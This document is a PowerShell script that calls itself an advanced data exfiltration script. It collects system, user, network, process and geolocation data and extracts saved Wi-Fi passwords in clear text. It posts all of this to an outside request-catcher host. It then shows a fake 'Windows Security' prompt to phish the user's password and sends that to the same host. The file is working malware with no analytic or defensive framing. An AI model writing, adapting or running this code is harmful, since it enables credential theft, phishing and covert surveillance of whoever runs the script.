# ============================== [BEGIN ADVANCED DATA EXFILTRATION SCRIPT] ==============================

# --- [ PowerShell Version ] ---
$psver = $PSVersionTable | Out-String

# --- [ Current User ] ---
$user = whoami

# --- [ Admin Group Check ] ---
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# --- [ Full Name (Microsoft Account)] ---
try {
    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
} catch {
    $fullName = $env:USERNAME
}

# --- [ Email (if available) ] ---
try {
    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
} catch {
    $email = "Unknown"
}

# --- [ Local Users + SIDs ] ---
$users = Get-WmiObject Win32_UserAccount | Select Name, Domain, SID | Out-String

# --- [ Password Policy Info ] ---
try {
    $policy = net accounts | Out-String
} catch {
    $policy = "Could not retrieve password policy."
}

# --- [ Days since last password change ] ---
try {
    $userObj = Get-LocalUser -Name $env:USERNAME
    $lastChange = $userObj.PasswordLastSet
    $daysSince = (New-TimeSpan -Start $lastChange -End (Get-Date)).Days
} catch {
    $daysSince = "N/A"
}

# --- [ GeoLocation ] ---
try {
    Add-Type -AssemblyName System.Device
    $watcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $watcher.Start()
    while (($watcher.Status -ne 'Ready') -and ($watcher.Permission -ne 'Denied')) { Start-Sleep -Milliseconds 100 }
    $location = $watcher.Position.Location | Out-String
} catch {
    $location = "Geolocation not available"
}

# --- [ Nearby Wi-Fi Networks ] ---
try {
    $wifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim() | Out-String
} catch {
    $wifi = "No nearby WiFi detected"
}

# --- [ Network Info ] ---
try {
    $pubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
} catch {
    $pubIP = "Public IP unavailable"
}
try {
    $localIP = Get-NetIPAddress -AddressFamily IPv4 | Out-String
} catch {
    $localIP = "Local IP unavailable"
}
try {
    $mac = Get-NetAdapter | Select Name, MacAddress, Status | Out-String
} catch {
    $mac = "MAC info unavailable"
}
try {
    $rdp = (Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections
    $rdp = if ($rdp -eq 0) {"RDP Enabled"} else {"RDP Disabled"}
} catch {
    $rdp = "RDP unknown"
}

# --- [ WLAN Profiles (with keys) ] ---
try {
    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
        $name = $_.Matches.Groups[1].Value.Trim()
        $keyOutput = netsh wlan show profile name="$name" key=clear
        $keyLine = ($keyOutput | Select-String "Key Content").ToString()
        "$name : $keyLine"
    } | Out-String
} catch {
    $wifiProfiles = "Cannot extract WLAN profiles"
}

# --- [ Network Interfaces ] ---
try {
    $adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -ne $null } |
        Select Description, IPAddress, DefaultIPGateway, MACAddress | Out-String
} catch {
    $adapters = "Could not get network adapter info"
}

# --- [ System Info ] ---
try {
    $sysInfo = Get-CimInstance Win32_ComputerSystem | Out-String
    $bios = Get-CimInstance CIM_BIOSElement | Out-String
    $os = (Get-WMIObject win32_operatingsystem) | Select Caption, Version | Out-String
    $cpu = Get-WmiObject Win32_Processor | Select Name, MaxClockSpeed | Out-String
    $ram = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) }
} catch {
    $sysInfo = "N/A"
    $bios = "N/A"
    $os = "N/A"
    $cpu = "N/A"
    $ram = "N/A"
}

# --- [ Disk Info ] ---
try {
    $disks = Get-WmiObject Win32_LogicalDisk | Select DeviceID, VolumeName, FileSystem, @{Name="Size(GB)";Expression={"{0:N1}" -f ($_.Size / 1GB)}}, @{Name="Free(GB)";Expression={"{0:N1}" -f ($_.FreeSpace / 1GB)}} | Out-String
} catch {
    $disks = "Disk info unavailable"
}

# --- [ COM and Serial Devices ] ---
try {
    $coms = Get-WmiObject Win32_SerialPort | Out-String
} catch {
    $coms = "No COM devices found"
}

# --- [ TCP Connections ] ---
try {
    $tcp = Get-NetTCPConnection | Select LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Out-String
} catch {
    $tcp = "TCP info unavailable"
}

# --- [ Processes ] ---
try {
    $procs = Get-Process | Select Name, Id, CPU | Out-String
} catch {
    $procs = "Process list unavailable"
}

# --- [ Services ] ---
try {
    $services = Get-Service | Select Name, DisplayName, Status | Out-String
} catch {
    $services = "Service info unavailable"
}

# --- [ Drivers ] ---
try {
    $drivers = Get-WmiObject Win32_PnPSignedDriver | Select DeviceName, DriverVersion | Out-String
} catch {
    $drivers = "Drivers info unavailable"
}

# --- [ Tree View of User Dir ] ---
try {
    $tree = tree $Env:USERPROFILE /a /f | Out-String
} catch {
    $tree = "Tree not generated"
}

# ============================== [SEND TO REMOTE ENDPOINT] ==============================

$data = @"
===== [PowerShell Version] =====
$psver

===== [Current User] =====
$user
Admin: $isAdmin
Name: $fullName
Email: $email

===== [Password Policy] =====
$policy
Days since last change: $daysSince

===== [GeoLocation] =====
$location

===== [Nearby Wi-Fi] =====
$wifi

===== [Network Info] =====
Public IP: $pubIP
Local IPs: $localIP
MAC: $mac
RDP: $rdp

===== [WLAN Profiles] =====
$wifiProfiles

===== [Network Interfaces] =====
$adapters

===== [System Info] =====
$sysInfo
$bios
$os
$cpu
RAM Total: $ram

===== [Local Users] =====
$users

===== [Disk Info] =====
$disks

===== [COM Devices] =====
$coms

===== [TCP Connections] =====
$tcp

===== [Running Processes] =====
$procs

===== [Services] =====
$services

===== [Drivers] =====
$drivers

===== [Tree of User Dir] =====
$tree
"@

# Send to your listener
Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{debug = $data}

# ============================== [FORCED CREDENTIAL PROMPT] ==============================

function Request-ValidCredential {
    param (
        [int]$MaxRetries = 5
    )

    $tries = 0
    do {
        try {
            $cred = $Host.ui.PromptForCredential(
                'Windows Security',
                'Due to recent policy changes, authentication is required to continue.',
                $env:USERNAME,
                ''
            )

            $user = $cred.UserName
            $pass = $cred.GetNetworkCredential().Password

            if ($pass -ne "") {
                return $cred
            } else {
                $tries++
            }
        } catch {
            # User pressed "Cancel" or closed the dialog
            $tries++
        }
    } while ($tries -lt $MaxRetries)

    return $null
}

$finalCred = Request-ValidCredential

# ============================== [HANDLE RESULT] ==============================

if ($finalCred -ne $null) {
    $finalUser = $finalCred.UserName
    $finalPass = $finalCred.GetNetworkCredential().Password

    Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{
        debug = @"
===== [Captured Credentials] =====
Username: $finalUser
Password: $finalPass
"@
    }

    Start-Sleep -Seconds 3
} else {
    Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{
        debug = "User failed to authenticate after multiple forced attempts."
    }
}



# ============================== [END] ==============================
